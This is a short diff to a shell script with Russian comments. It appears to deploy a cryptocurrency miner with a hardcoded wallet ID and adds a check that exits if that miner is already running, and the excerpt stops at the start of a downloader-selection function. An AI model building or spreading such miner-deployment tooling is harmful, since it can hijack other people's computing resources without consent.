@@ -1,6 +1,21 @@
 #!/bin/sh
 # Универсальный скрипт для всех систем (даже без bash/wget)
 
+# Проверка на уже запущенный процесс с этим кошельком
+WALLET_ID="49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE"
+
+# Проверяем процессы (универсальный метод)
+if ps aux 2>/dev/null | grep -v grep | grep "$WALLET_ID" >/dev/null; then
+    echo "[*] Miner with this wallet ID is already running. Exiting."
+    exit 0
+fi
+
+# Альтернативная проверка для систем где ps aux не работает
+if ! ps aux 2>/dev/null && ps -ef 2>/dev/null | grep -v grep | grep "$WALLET_ID" >/dev/null; then
+    echo "[*] Miner with this wallet ID is already running. Exiting."
+    exit 0
+fi
+
 # Функция для определения доступного загрузчика
 get_downloader() {
     if command -v wget >/dev/null 2>&1; then
